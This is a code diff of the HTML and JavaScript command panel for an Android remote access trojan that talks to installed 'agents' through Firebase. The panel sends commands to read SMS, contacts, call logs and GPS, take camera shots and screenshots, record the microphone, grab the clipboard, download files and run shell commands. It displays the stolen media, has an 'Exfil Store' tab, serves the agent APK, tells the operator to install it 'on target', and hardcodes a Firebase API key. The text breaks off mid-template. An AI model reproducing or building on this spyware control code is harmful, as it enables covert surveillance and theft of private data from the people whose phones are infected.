@@ -1,113 +1,271 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>RAT Panel</title>
+<title>RAT Control Panel</title>
 <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database-compat.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
 <style>
-  * { box-sizing:border-box; }
-  body { margin:0; font:14px "Segoe UI",system-ui,sans-serif; background:#0d0d0d; color:#bfbfbf; }
-  header { padding:14px 20px; background:#161616; border-bottom:1px solid #2a2a2a; display:flex; justify-content:space-between; align-items:center; }
-  header h1 { margin:0; font-size:18px; color:#7fff7f; }
-  main { max-width:1100px; margin:0 auto; padding:16px; }
-  h2 { color:#7fff7f; font-size:15px; margin:20px 0 8px; }
-  .row { border:1px solid #222; background:#141414; padding:10px; margin-bottom:10px; border-radius:6px; }
-  .row .dev { font-weight:600; color:#4caf50; }
-  .row .meta { color:#888; font-size:12px; margin:2px 0 8px; }
-  button { background:#1e1e1e; color:#7fff7f; border:1px solid #2c2c2c; padding:5px 12px; margin:2px 4px 2px 0; border-radius:4px; cursor:pointer; font-size:13px; }
-  button:hover { background:#26381f; }
-  button.flat { color:#ccc; }
-  input[type=text] { background:#1a1a1a; border:1px solid #333; color:#8f8; padding:6px 8px; border-radius:4px; width:280px; margin-right:4px; }
-  select { background:#1a1a1a; color:#8f8; border:1px solid #333; padding:6px; border-radius:4px; }
-  pre { background:#000; color:#7fff7f; padding:10px; max-height:360px; overflow:auto; border:1px solid #222; border-radius:4px; font-size:12px; white-space:pre-wrap; }
-  .badge { display:inline-block; padding:2px 8px; border-radius:3px; font-size:11px; }
-  .on  { background:#123f12; color:#7fff7f; }
-  .off { background:#3f1212; color:#ff7f7f; }
-  #preview { display:none; margin-top:10px; }
-  table { width:100%; border-collapse:collapse; font-size:12px; }
-  table th, table td { border-bottom:1px solid #222; padding:4px 6px; text-align:left; }
-  table th { color:#4caf50; }
-  .dl { background:#123f3f; color:#7fffff; }
+  :root{
+    --bg:#0a0f1a;
+    --bg-card:#121826;
+    --bg-hover:#1a2233;
+    --border:#1f2941;
+    --accent:#4CAF50;
+    --accent-2:#66bb6a;
+    --text:#e8ecf3;
+    --muted:#7d8a9f;
+    --danger:#ff5252;
+    --warn:#ffb74d;
+    --info:#4fc3f7;
+    --grad: linear-gradient(145deg, rgba(76,175,80,.15), rgba(79,195,247,.05));
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%}
+  body{
+    font-family:"Inter",system-ui,sans-serif;
+    background:var(--bg); color:var(--text);
+    display:flex; min-height:100vh; overflow-x:hidden;
+  }
+
+  /* ---------- SIDEBAR ---------- */
+  .sidebar{
+    width:240px; flex-shrink:0; background:#0d1320;
+    border-right:1px solid var(--border);
+    display:flex; flex-direction:column; padding:18px 12px;
+    position:sticky; top:0; height:100vh; overflow-y:auto;
+  }
+  .brand{
+    display:flex; align-items:center; gap:10px; margin-bottom:24px; padding:0 6px;
+  }
+  .brand .dot{
+    width:10px;height:10px;border-radius:50%;
+    background:var(--accent);
+    box-shadow:0 0 10px var(--accent);
+    animation:pulse 2s infinite;
+  }
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+  .brand h1{
+    font-size:15px; font-weight:600; letter-spacing:.5px; color:#fff;
+  }
+  .brand h1 span{color:var(--accent);font-weight:700}
+
+  .nav{display:flex; flex-direction:column; gap:4px; flex:1}
+  .nav button{
+    display:flex; align-items:center; gap:10px;
+    padding:10px 12px; border-radius:8px; border:none; cursor:pointer;
+    background:transparent; color:var(--muted);
+    font-size:14px; text-align:left; transition:.15s;
+  }
+  .nav button:hover{background:var(--bg-hover);color:var(--text)}
+  .nav button.active{
+    background:var(--grad); color:var(--accent); font-weight:600;
+    border-left:2px solid var(--accent); padding-left:10px;
+  }
+  .nav .icon{font-size:17px;width:20px;text-align:center}
+
+  .side-foot{
+    margin-top:auto; font-size:11px; color:#48546b;
+    border-top:1px solid var(--border); padding:12px 6px;
+  }
+  .side-foot span{color:var(--accent);font-weight:600}
+
+  /* ---------- MAIN ---------- */
+  .main{
+    flex:1; padding:24px 28px; min-width:0;
+  }
+  .topbar{
+    display:flex; align-items:center; justify-content:space-between;
+    margin-bottom:24px;
+  }
+  .topbar h2{
+    font-size:22px; font-weight:700; letter-spacing:-.3px; color:#fff;
+  }
+  .topbar .live{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--muted)}
+  .topbar .live .bullet{
+    width:8px;height:8px;border-radius:50%;background:var(--accent);
+    box-shadow:0 0 8px var(--accent);
+  }
+  .topbar .live .bullet.off{background:var(--danger);box-shadow:0 0 8px var(--danger)}
+
+  /* ---------- CARDS ---------- */
+  .cards{
+    display:grid; grid-template-columns:repeat(auto-fit, minmax(180px,1fr));
+    gap:14px; margin-bottom:28px;
+  }
+  .card{
+    background:var(--bg-card); border:1px solid var(--border);
+    border-radius:12px; padding:18px 20px; transition:.15s;
+  }
+  .card:hover{background:var(--bg-hover);transform:translateY(-2px)}
+  .card .label{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.8px;margin-bottom:6px}
+  .card .val{font-size:26px;font-weight:700;color:#fff;line-height:1}
+  .card.green .val{color:var(--accent)}
+  .card.blue .val{color:var(--info)}
+  .card.orange .val{color:var(--warn)}
+  .card.red .val{color:var(--danger)}
+
+  .section-title{
+    font-size:14px; font-weight:600; color:#fff; margin:0 0 14px;
+    display:flex; justify-content:space-between; align-items:center;
+  }
+  .section-title .muted{color:var(--muted); font-size:12px; font-weight:400}
+
+  /* ---------- DEVICE GRID ---------- */
+  .dev-grid{display:grid; grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); gap:14px}
+  .dev-card{
+    background:var(--bg-card); border:1px solid var(--border);
+    border-radius:12px; padding:16px 18px; cursor:pointer;
+    transition:.15s; position:relative;
+  }
+  .dev-card:hover{background:var(--bg-hover); transform:translateY(-1px); border-color:#2c3a5c}
+  .dev-card .pill{
+    position:absolute; top:16px; right:16px;
+    padding:3px 10px; border-radius:20px; font-size:10px; font-weight:600;
+    letter-spacing:.4px;
+  }
+  .pill.on{
+    background:rgba(76,175,80,.15); color:var(--accent); border:1px solid rgba(76,175,80,.3);
+  }
+  .pill.off{
+    background:rgba(255,82,82,.12); color:var(--danger); border:1px solid rgba(255,82,82,.3);
+  }
+  .dev-card h3{font-size:15px; font-weight:600; color:#fff; margin-bottom:2px}
+  .dev-card .sub{font-size:12px;color:var(--muted);line-height:1.5}
+  .dev-card .mini-actions{margin-top:12px;display:flex;gap:6px;flex-wrap:wrap}
+  .btn{
+    background:#1a2233; color:var(--text); border:1px solid #2a3648;
+    padding:6px 12px; border-radius:6px; font-size:12px; cursor:pointer;
+    transition:.15s; font-family:inherit;
+  }
+  .btn:hover{background:#243048; border-color:#3a4a68}
+  .btn.green{background:rgba(76,175,80,.15); color:var(--accent); border-color:rgba(76,175,80,.3)}
+  .btn.green:hover{background:rgba(76,175,80,.25)}
+  .btn.blue{background:rgba(79,195,247,.12); color:var(--info); border-color:rgba(79,195,247,.3)}
+  .btn.blue:hover{background:rgba(79,195,247,.2)}
+  .btn.red{background:rgba(255,82,82,.12); color:var(--danger); border-color:rgba(255,82,82,.3)}
+  .btn.red:hover{background:rgba(255,82,82,.2)}
+  .btn.warn{background:rgba(255,183,77,.12); color:var(--warn); border-color:rgba(255,183,77,.3)}
+  .btn.warn:hover{background:rgba(255,183,77,.2)}
+  .btn.sm{padding:4px 10px; font-size:11px}
+
+  /* ---------- DETAIL PANEL ---------- */
+  .detail{
+    background:var(--bg-card); border:1px solid var(--border);
+    border-radius:14px; padding:0; margin-top:20px; overflow:hidden;
+  }
+  .detail-head{
+    padding:18px 22px; border-bottom:1px solid var(--border);
+    display:flex; align-items:center; gap:14px; flex-wrap:wrap;
+  }
+  .detail-head .name{font-size:17px; font-weight:700; color:#fff; flex:1; min-width:200px}
+  .detail-head .meta{font-size:12px; color:var(--muted); margin-top:3px}
+  .close{background:none;border:none;color:var(--muted);font-size:22px;cursor:pointer;padding:0 8px;font-family:inherit}
+  .close:hover{color:var(--danger)}
+
+  .tabs{
+    display:flex; gap:2px; padding:0 12px; border-bottom:1px solid var(--border);
+    overflow-x:auto; background:#0e1420;
+  }
+  .tabs button{
+    background:none;border:none;color:var(--muted);cursor:pointer;
+    padding:13px 16px;font-size:13px; font-family:inherit;
+    border-bottom:2px solid transparent; white-space:nowrap; transition:.15s;
+  }
+  .tabs button:hover{color:var(--text)}
+  .tabs button.active{color:var(--accent); border-bottom-color:var(--accent); font-weight:600}
+
+  .tab-body{padding:22px; min-height:120px; max-height:70vh; overflow-y:auto}
+
+  table{width:100%;border-collapse:collapse;font-size:13px;margin-top:8px}
+  table th, table td{border-bottom:1px solid var(--border);padding:9px 10px;text-align:left}
+  table th{color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.6px;font-weight:600}
+  table tr:hover td{background:var(--bg-hover)}
+  table .num{font-family:"Inter",monospace; font-size:12px}
+
+  .grid-img{
+    display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:10px; margin-top:10px;
+  }
+  .grid-img img{
+    width:100%; border-radius:8px; border:1px solid var(--border);
+  }
+
+  pre.code{
+    background:#0c1119; border:1px solid var(--border); border-radius:8px;
+    padding:12px; font-family:"Inter",monospace; font-size:12px;
+    color:#a5d6a7; max-height:400px; overflow:auto; white-space:pre-wrap;
+    margin-top:10px;
+  }
+  input,.input{
+    background:#0e1420; border:1px solid #2a3648; color:var(--text);
+    padding:8px 12px; border-radius:6px; font-size:13px; font-family:"Inter",monospace;
+    width:280px; outline:none; margin-right:6px; transition:.15s; vertical-align:middle;
+  }
+  input:focus,.input:focus{border-color:var(--accent)}
+
+  .toolbar{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:14px}
+  .toast{
+    position:fixed; bottom:22px; right:22px;
+    background:#1a2233; color:var(--text); border:1px solid var(--border);
+    border-radius:8px; padding:12px 18px; font-size:13px;
+    box-shadow:0 8px 24px rgba(0,0,0,.4);
+    opacity:0; transform:translateY(10px);
+    transition:.25s; pointer-events:none; z-index:1000;
+  }
+  .toast.show{opacity:1;transform:translateY(0)}
+
+  .empty{color:#5a6a85; font-size:13px; text-align:center; padding:40px 20px}
+  .crash-item{
+    background:var(--bg-card); border:1px solid var(--border);
+    border-radius:10px; padding:14px 16px; margin-bottom:12px;
+  }
+  .crash-item .when{font-size:11px;color:var(--muted);margin-bottom:6px}
+  .crash-item .msg{font-size:13px; color:var(--danger); font-weight:600; margin-bottom:8px}
+  .crash-item .stack{font-family:monospace; font-size:11px; color:#8d99ae; white-space:pre-wrap; max-height:160px; overflow-y:auto}
+
+  .badge-alias{
+    background:rgba(79,195,247,.1); color:var(--info);
+    padding:2px 8px; border-radius:4px; font-size:11px; margin-left:6px;
+  }
 </style>
 </head>
 <body>
-<header>
-  <h1>&#9679; RAT Control Panel</h1>
-  <div>
-    <a id="apkBtn" class="dl" href="/apk" style="text-decoration:none;color:#7fffff">&#8595; Agent APK</a>
+
+<aside class="sidebar">
+  <div class="brand">
+    <span class="dot"></span>
+    <h1>RAT<span>Panel</span> v6</h1>
   </div>
-</header>
-<script>
-// turn APK button into a direct download link the moment one lands in apk/
-function refreshApkBtn() {
-  fetch('/apk').then(r=>r.json()).then(j=>{
-    if (j.apks && j.apks.length) {
-      document.getElementById('apkBtn').href = '/apk/' + j.apks[0];
-      document.getElementById('apkBtn').textContent = '\u2193 ' + j.apks[0];
-    }
-  }).catch(()=>{});
-}
-refreshApkBtn();
-setInterval(refreshApkBtn, 5000);
-</script>
-<main>
+  <div class="nav">
+    <button data-view="dashboard" class="active"><span class="icon">&#9632;</span> Dashboard</button>
+    <button data-view="devices"><span class="icon">&#9642;</span> Devices</button>
+    <button data-view="crashes"><span class="icon">&#9888;</span> Crashes <span id="crashBadge" style="margin-left:auto;background:var(--danger);color:#fff;border-radius:10px;padding:1px 7px;font-size:10px;display:none">0</span></button>
+    <button data-view="all-files"><span class="icon">&#128193;</span> File Browser</button>
+    <button data-view="apks"><span class="icon">&#11015;</span> Agent APK</button>
+    <button data-view="debug"><span class="icon">&#128295;</span> Diagnostics</button>
+  </div>
+  <div class="side-foot">
+    <span>olltaterfx</span> &mdash; bench build<br/>
+    <span id="fbState">connecting…</span>
+  </div>
+</aside>
 
-<h2>Agents</h2>
-<div id="agents"><i>scanning…</i></div>
+<main class="main">
+  <div class="topbar">
+    <h2 id="viewTitle">Dashboard</h2>
+    <div class="live">
+      <span class="bullet" id="liveDot"></span>
+      <span id="liveTxt">streaming</span>
+    </div>
+  </div>
 
-<h2>Memory (REST snapshot)</h2>
-<div id="memory"><i>idle</i></div>
-
-<h2>Output</h2>
-<pre id="output">waiting…</pre>
-
-<h2>Diagnostics</h2>
-<pre id="diag" style="color:#7f7fff">running…</pre>
-
-<h2>Crashes</h2>
-<pre id="crashes" style="color:#ff7f7f">no crashes</pre>
-<script>
-// full diagnostics — pinpoint exactly where the wire breaks
-const diagOut = [];
-function dlog(l){ diagOut.push(l); var d=document.getElementById('diag'); if(d) d.textContent = diagOut.join('\n'); }
-async function runDiagnostics() {
-  dlog('[1] testing firebase read of /agents …');
-  try {
-    const snap = await db.ref('agents').limitToLast(1).once('value');
-    const keys = snap.val() ? Object.keys(snap.val()) : [];
-    dlog('[1] OK — read works, found ' + keys.length + ' agent(s): ' + keys.join(', '));
-  } catch(e){ dlog('[1] READ FAILED: '+e.message); }
-
-  dlog('[2] testing firebase WRITE of /debugpanel/writetest …');
-  try {
-    await db.ref('debugpanel/writetest').set({ts: Date.now()});
-    dlog('[2] OK — panel CAN write commands to agents. other issue.');
-  } catch(e){ dlog('[2] WRITE FAILED: '+e.message+'   << panel cannot reach device. publish the rules JSON; this is why SMS showed nothing.'); }
-
-  dlog('[3] checking connected state …');
-  db.ref('.info/connected').on('value', s => dlog('[3] ' + (s.val() ? 'CONNECTED to firebase realtime' : 'DISCONNECTED from firebase realtime')));
-}
-runDiagnostics();
-setInterval(()=>db.ref('.info/connected').on('value', s => dlog('[3] ' + (s.val() ? 'CONNECTED to firebase realtime' : 'DISCONNECTED'))), 20000);
-
-// full crashes feed
-db.ref('crashes').on('value', snap => {
-  const v = snap.val() || {};
-  const lines = [];
-  for (const [dev, byts] of Object.entries(v)) {
-    for (const [ts, c] of Object.entries(byts)) {
-      lines.push('['+new Date(Number(ts)).toLocaleString()+'] '+dev+' — '+c.type+': '+c.message+'\n'+c.stack+'\n');
-    }
-  }
-  document.getElementById('crashes').textContent = lines.length ? lines.slice(-5).join('\n') : 'no crashes';
-}, e => {
-  document.getElementById('crashes').textContent = 'crash listener: '+e.message;
-});
-</script>
-
+  <div id="view"></div>
 </main>
+
+<div class="toast" id="toast"></div>
+
 <script>
 const firebaseConfig = {
   apiKey: "AIzaSyBnm5Crd7MANpMGxtf85ENKlE-CC0gKEIE",
@@ -121,150 +279,593 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-const URL_HELPER = location.origin + '/panel.html';
+const state = {
+  view: 'dashboard',
+  agents: {},
+  crashes: {},
+  results: {},
+  selectedDevice: null,
+  selectedTab: 'overview',
+  fileCwd: {},
+  search: '',
+};
 
-function fmtTs(t) {
-  if (!t) return '—';
-  const d = new Date(t);
-  const diff = Date.now() - t;
-  return d.toLocaleTimeString() + ' (' + (diff < 20000 ? 'online' : Math.floor(diff/60000)+'m ago') + ')';
+const VIEW_TITLES = {
+  dashboard: 'Dashboard',
+  devices:   'Devices',
+  crashes:   'Crashes',
+  'all-files':'File Browser',
+  apks:      'Agent APK Distribution',
+  debug:     'Diagnostics',
+};
+
+// ---------------------------------------------------------------- helpers
+function fmt(ts){
+  if(!ts) return '—';
+  const d = new Date(ts);
+  const diff = Date.now()-ts;
+  const ago = diff<60000 ? 'just now'
+    : diff<3600000 ? Math.floor(diff/60000)+'m ago'
+    : diff<86400000 ? Math.floor(diff/3600000)+'h ago'
+    : Math.floor(diff/86400000)+'d ago';
+  return ago + ' · ' + d.toLocaleTimeString();
 }
-
-function setPending() {
-  document.getElementById('output').textContent = '>> ' + currentAction + ' dispatched, waiting…';
+function bytes(n){
+  if(n==null) return '—';
+  if(n<1024) return n+' B';
+  if(n<1048576) return (n/1024).toFixed(1)+' KB';
+  if(n<1073741824) return (n/1048576).toFixed(1)+' MB';
+  return (n/1073741824).toFixed(2)+' GB';
 }
+function esc(s){ return String(s??'').replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+function toast(msg){
+  const t=document.getElementById('toast');
+  t.textContent=msg; t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'), 2600);
+}
+function pad(n){ return n<10 ? '0'+n : n; }
+function escPath(p){ return p.replace(/[.#$/\[\]]/g, '_'); }
 
-document.getElementById('output').textContent = 'panel booted, agents loading…';
-
-// ---- agent list, full live read
-db.ref('agents').on('value', snap => {
-  const agents = snap.val() || {};
-  const el = document.getElementById('agents');
-  el.innerHTML = '';
-
-  const ids = Object.keys(agents);
-  if (!ids.length) {
-    el.innerHTML = '<i>no agents connected — install APK on device and wait ~10s</i>';
-    return;
-  }
-
-  for (const [id, a] of Object.entries(agents)) {
-    const prof = a.profile || {};
-    const lastSeen = prof.lastSeen || 0;
-    const online = (Date.now() - lastSeen) < 25000;
-    const Row = document.createElement('div');
-    Row.className = 'row';
-    Row.innerHTML =
-      '<span class="dev">'+id+'</span> ' +
-      '<span class="badge '+(online?'on':'off')+'">'+(online?'ONLINE':'OFFLINE')+'</span><br/>' +
-      '<div class="meta">'+(prof.manufacturer||'?')+' '+(prof.model||'?')+' — Android '+(prof.version||'?')+' (SDK '+(prof.sdk||'?')+') — seen '+fmtTs(lastSeen)+'</div>' +
-      '<button data-c="device_info">Info</button>' +
-      '<button data-c="location">Location</button>' +
-      '<button data-c="sms">SMS</button>' +
-      '<button data-c="contacts">Contacts</button>' +
-      '<button data-c="call_log">Call Log</button>' +
-      '<button data-c="camera_front" class="flat">Cam front</button>' +
-      '<button data-c="camera_back" class="flat">Cam back</button>' +
-      '<button data-c="mic_record" class="flat">Mic 10s</button>' +
-      '<button data-c="battery" class="flat">Battery</button>' +
-      '<button data-c="app_list" class="flat">Apps</button>' +
-      '<button data-c="clipboard" class="flat">Clipboard</button>' +
-      '<button data-c="screenshot" class="flat">Screen</button>' +
-      '<button data-c="list_files" data-arg="/sdcard">List /sdcard</button>' +
-      '<input type="text" id="path_'+id+'" placeholder="/sdcard/Download/file.jpg"/>' +
-      '<button data-c="list_files" class="flat" data-arg="#path">Path</button>' +
-      '<button data-c="download_file" data-arg="#path">Download</button><br/>' +
-      '<input type="text" id="sh_'+id+'" placeholder="$ pm list packages"/>' +
-      '<button data-c="shell" class="flat" data-arg="#sh">exec</button>';
-    Row.querySelectorAll('button').forEach(btn => {
-      btn.onclick = () => {
-        let arg = btn.dataset.arg;
-        if (arg === '#path') arg = document.getElementById('path_'+id).value;
-        if (arg === '#sh')   arg = document.getElementById('sh_'+id).value;
-        sendCommand(id, btn.dataset.c, arg || '');
-      };
-    });
-    el.appendChild(Row);
-  }
-}, err => {
-  document.getElementById('agents').innerHTML =
-    '<i style="color:#f87">RTDB read failed: '+err.message+' — check database rules + internet</i>';
+// ---------------------------------------------------------------- firebase hookups
+db.ref('.info/connected').on('value', s => {
+  const on = s.val();
+  document.getElementById('fbState').textContent = on ? 'connected · live' : 'offline';
+  document.getElementById('liveDot').className = 'bullet' + (on?'':' off');
+  document.getElementById('liveTxt').textContent = on ? 'streaming' : 'reconnecting…';
 });
 
-// ---- push a command into the live agent
-let currentAction = '';
-function sendCommand(device, action, arg) {
-  currentAction = action;
-  const ref = db.ref('agents/'+device+'/commands').push();
-  ref.set({ action: action, arg: arg });
-  document.getElementById('output').textContent =
-    '>> ['+device+'] '+action+' '+(arg||'') + ' — dispatched, waiting…';
-}
-
-// ---- stream results live: both the flat map and the per-agent node
-function showResult(dev, cmdKey, payload) {
-  document.getElementById('output').textContent =
-    'RESULTS — device: ' + (dev || '?') + ' cmd: ' + (cmdKey || '') + '\n' +
-    JSON.stringify(payload, null, 2);
-  previewPayload(payload);
-}
-
-function listenResults(dev) {
-  db.ref('agents/' + dev + '/results').limitToLast(3).on('child_added', s => {
-    showResult(dev, s.key, s.val());
-  }, e => dlog('/agents/results read failed: ' + e.message));
-}
-let listenedDev = null;
 db.ref('agents').on('value', snap => {
-  const ids = Object.keys(snap.val() || {});
-  if (ids.length && listenedDev !== ids[0]) {
-    if (listenedDev) db.ref('agents/' + listenedDev + '/results').off();
-    listenedDev = ids[0];
-    listenResults(listenedDev);
-  }
+  state.agents = snap.val() || {};
+  render();
+}, e => { document.getElementById('view').innerHTML = `<div class="empty">read failed: ${e.message}<br/>check RTDB rules</div>`; });
+db.ref('crashes').on('value', snap => { state.crashes = snap.val() || {}; render(); });
+db.ref('results').on('value', snap => { state.results = snap.val() || {}; render(); });
+
+// ---------------------------------------------------------------- commands
+function sendCommand(dev, action, arg) {
+  const key = db.ref('agents/'+dev+'/commands').push();
+  key.set({ action: action, arg: arg ?? '' })
+    .then(()=>toast(`⚡ ${action} → ${dev} dispatched`))
+    .catch(e=>toast(`✗ ${action} write failed: ${e.message}`));
+}
+function aliasOf(a, id){ return (a.profile?.alias) || a.profile?.model || id; }
+function isOnline(a){ return a.profile?.lastSeen && (Date.now() - a.profile.lastSeen) < 25000; }
+
+// ---------------------------------------------------------------- navigation
+document.querySelectorAll('.nav button').forEach(btn => {
+  btn.onclick = () => {
+    document.querySelectorAll('.nav button').forEach(b=>b.classList.remove('active'));
+    btn.classList.add('active');
+    state.view = btn.dataset.view;
+    state.selectedDevice = null;   // leaving device drill
+    document.getElementById('viewTitle').textContent = VIEW_TITLES[state.view] || 'Panel';
+    render();
+  };
 });
 
-// ---- rebuild data delivered table from agent /data nodes
-function previewPayload(payload) {
-  const pv = document.getElementById('preview');
-  const mem = document.getElementById('memory');
-  if (!payload.data) { pv.style.display='none'; return; }
-  const d = payload.data;
-
-  // camera shot
-  if (d.body && d.facing) {
-    mem.innerHTML = '<p style="color:#7fff7f">'+ d.facing +' shot, '+d.size+' bytes base64</p>'+
-      '<img src="data:image/jpeg;base64,'+d.body+'" style="max-width:320px;max-height:320px;border:1px solid #2a2a2a"/>';
-    return;
-  }
-  // screenshot
-  if (d.body && d.w && d.h) {
-    mem.innerHTML = '<p style="color:#ffff7f">screen capture '+d.w+'x'+d.h+'</p>'+
-      '<img src="data:image/jpeg;base64,'+d.body+'" style="max-width:420px;max-height:320px;border:1px solid #2a2a2a"/>';
-    return;
-  }
-  // mic audio
-  if (d.body && d.dur) {
-    mem.innerHTML = '<p style="color:#7fffff">mic '+d.dur+'s, '+d.size+' bytes</p>'+
-      '<audio controls src="data:audio/mp4;base64,'+d.body+'"></audio>';
-    return;
-  }
-  if (Array.isArray(d)) {
-    mem.innerHTML = renderTable(d);
-  } else if (Array.isArray(d.data)) {
-    mem.innerHTML = renderTable(d.data);
-  } else {
-    mem.innerHTML = '<pre>' + JSON.stringify(d, null, 2) + '</pre>';
+// ---------------------------------------------------------------- RENDER
+function render(){
+  const v = document.getElementById('view');
+  switch (state.view) {
+    case 'dashboard': return renderDashboard(v);
+    case 'devices':   return state.selectedDevice ? renderDetail(v) : renderDevices(v);
+    case 'crashes':   return renderCrashes(v);
+    case 'all-files': return renderFileBrowser(v);
+    case 'apks':      return renderApks(v);
+    case 'debug':     return renderDebug(v);
   }
 }
 
-function renderTable(rows) {
-  if (!rows.length) return '<i>empty</i>';
+function renderDashboard(v){
+  const ids = Object.keys(state.agents);
+  const online = ids.filter(id=>isOnline(state.agents[id])).length;
+  const cmds = Object.values(state.results).reduce((n,o)=>n+Object.keys(o||{}).length, 0);
+  const crashCount = Object.values(state.crashes).reduce((n,o)=>n+Object.keys(o||{}).length, 0);
+  document.getElementById('crashBadge').textContent = crashCount;
+  document.getElementById('crashBadge').style.display = crashCount ? 'inline' : 'none';
+
+  // feed: last 5 results across all agents
+  const feed=[];
+  for(const [dev, byCmd] of Object.entries(state.results)){
+    for(const [k,p] of Object.entries(byCmd||{})){
+      feed.push({dev, k, p});
+    }
+  }
+  feed.sort((a,b)=>(b.p.ts||0)-(a.p.ts||0));
+  const last = feed.slice(0,6);
+
+  v.innerHTML = `
+  <div class="cards">
+    <div class="card green"><div class="label">Online Agents</div><div class="val">${online}</div></div>
+    <div class="card blue"><div class="label">Total Agents</div><div class="val">${ids.length}</div></div>
+    <div class="card orange"><div class="label">Commands Run</div><div class="val">${cmds}</div></div>
+    <div class="card red"><div class="label">Crashes</div><div class="val">${crashCount}</div></div>
+  </div>
+  <div class="section-title">Agents <span class="muted">${online} online</span></div>
+  <div class="dev-grid">
+    ${ids.length ? ids.map(id=>{
+      const a=state.agents[id], p=a.profile||{};
+      return `<div class="dev-card" onclick="drillDevice('${id}')">
+        <span class="pill ${isOnline(a)?'on':'off'}">${isOnline(a)?'ONLINE':'OFFLINE'}</span>
+        <h3>${esc(aliasOf(a,id))}${p.alias?`<span class="badge-alias">${esc(p.model||'')}</span>`:''}</h3>
+        <div class="sub">${esc(p.manufacturer||'')} · Android ${esc(p.version||'?')} (SDK ${esc(p.sdk||'?')})<br/>seen ${fmt(p.lastSeen)}</div>
+        <div class="mini-actions">
+          <button class="btn sm green" onclick="event.stopPropagation(); sendCommand('${id}','device_info')">Info</button>
+          <button class="btn sm blue" onclick="event.stopPropagation(); sendCommand('${id}','location')">GPS</button>
+          <button class="btn sm" onclick="event.stopPropagation(); sendCommand('${id}','battery')">Battery</button>
+        </div>
+      </div>`;
+    }).join('') : `<div class="empty" style="grid-column:1/-1">no agents connected — install APK and tap open once</div>`}
+  </div>
+  <div class="section-title" style="margin-top:30px">Latest Activity <span class="muted">live feed</span></div>
+  <table>
+    <thead><tr><th>Device</th><th>Action</th><th>Status</th><th>Rows</th><th>When</th></tr></thead>
+    <tbody>
+      ${last.map(f=>{
+        const d=f.p?.data;
+        const rows = Array.isArray(d) ? d.length
+          : (typeof d==='object' && d) ? Object.keys(d).length : 1;
+        return `<tr><td class="num">${esc(f.dev)}</td>
+          <td>${esc(f.p?.action ?? '?')}</td>
+          <td>${(f.p?.error||f.p?.data?.error) ? '<span style="color:var(--danger)">error</span>' : '<span style="color:var(--accent)">OK</span>'}</td>
+          <td class="num">${rows}</td>
+          <td class="num">${fmt(f.p?.ts)}</td></tr>`;
+      }).join('') || '<tr><td colspan="5" class="empty">no commands run yet</td></tr>'}
+    </tbody>
+  </table>`;
+}
+
+function renderDevices(v){
+  const ids = Object.keys(state.agents);
+  v.innerHTML = `<div class="section-title">All Devices <span class="muted">click to manage</span></div>
+  <div class="dev-grid">${ids.length ? ids.map(id=>{
+    const a=state.agents[id], p=a.profile||{};
+    const online = isOnline(a);
+    return `<div class="dev-card" onclick="drillDevice('${id}')">
+      <span class="pill ${online?'on':'off'}">${online?'ONLINE':'OFFLINE'}</span>
+      <h3>${esc(aliasOf(a,id))}${p.alias?`<span class="badge-alias">${esc(p.model||'')}</span>`:''}</h3>
+      <div class="sub">
+        <b>ID</b> ${esc(id)}<br/>
+        ${esc(p.manufacturer||'')} ${esc(p.model||'')} · Android ${esc(p.version||'?')}<br/>
+        ${esc(p.brand||'')} ${esc(p.product||'')} · SDK ${esc(p.sdk||'?')}<br/>
+        <span>${fmt(p.lastSeen)}</span>
+      </div>
+      <div class="mini-actions">
+        <button class="btn sm" onclick="event.stopPropagation(); renameDevice('${id}')">✎ Alias</button>
+        <button class="btn sm blue" onclick="event.stopPropagation(); sendCommand('${id}','device_info')">Info</button>
+        <button class="btn sm red" onclick="event.stopPropagation(); deleteDevice('${id}')">Delete</button>
+      </div>
+    </div>`;
+  }).join('') : `<div class="empty" style="grid-column:1/-1">no devices connected — install APK on target and open once</div>`}</div>`;
+}
+window.drillDevice = id => {
+  state.selectedDevice = id;
+  state.selectedTab = 'overview';
+  document.getElementById('viewTitle').textContent = 'Manage: ' + aliasOf(state.agents[id], id);
+  render();
+};
+window.renameDevice = id => {
+  const cur = state.agents[id]?.profile?.alias || '';
+  const nv = prompt('Alias for ' + id, cur);
+  if (nv!=null && nv!==cur) {
+    db.ref('agents/'+id+'/profile/alias').set(nv)
+      .then(()=>toast('alias set to '+nv))
+      .catch(e=>toast('alias set failed: '+e.message));
+  }
+};
+window.deleteDevice = id => {
+  if (!confirm('Delete device '+id+' — removes /agents, /results and crashes permanently?')) return;
+  Promise.all([
+    db.ref('agents/'+id).remove(),
+    db.ref('results/'+id).remove(),
+    db.ref('crashes/'+id).remove(),
+  ]).then(()=>toast('device '+id+' deleted')).catch(e=>toast('delete failed: '+e.message));
+};
+
+// ---------------------------------------------------------------- DETAIL VIEW
+const TABS = [
+  ['overview','Overview'],
+  ['sms','SMS'],
+  ['contacts','Contacts'],
+  ['calls','Call Log'],
+  ['camera','Camera'],
+  ['mic','Mic'],
+  ['apps','Apps'],
+  ['files','Files'],
+  ['screen','Screen'],
+  ['shell','Shell'],
+  ['data-store','Exfil Store'],
+  ['actions','Danger Zone'],
+];
+
+function renderDetail(v){
+  const id = state.selectedDevice;
+  const a = state.agents[id] || {};
+  const p = a.profile || {};
+  const online = isOnline(a);
+
+  v.innerHTML = `
+  <div class="detail">
+    <div class="detail-head">
+      <div class="name">
+        ${esc(aliasOf(a,id))}
+        <span class="pill ${online?'on':'off'}">${online?'ONLINE':'OFFLINE'}</span>
